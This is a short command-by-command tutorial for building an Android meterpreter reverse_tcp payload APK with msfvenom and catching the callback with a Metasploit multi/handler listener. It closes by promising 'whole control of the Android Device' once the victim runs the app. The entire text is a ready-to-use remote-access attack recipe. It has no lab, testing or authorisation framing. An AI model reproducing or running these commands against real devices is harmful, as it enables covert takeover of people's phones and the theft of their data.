sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> R > /path/to/your/payload.apk
   [This command creates an Android payload APK. Replace `<Your_IP>` with your IP address and `<Your_Port>` with the port you want to use.]

sudo msfconsole
   [Start the Metasploit console.]

use exploit/multi/handler
   [Use the multi/handler exploit to set up a listener for the payload.]

set payload android/meterpreter/reverse_tcp
   [Set the payload to listen for the Android reverse TCP connection.]

set LHOST <Your_IP>
   [Set your IP address.]

set LPORT <Your_Port>
   [Set the port you used when creating the payload.]

set ExitOnSession false
   [When the payload session is exits your terminal will not close.]

exploit
   [Start the exploit and wait for the connection from the Android device.]

[Once the payload is executed on the Android device, you will get a meterpreter session. and also you got the whole control of the Android Device.]
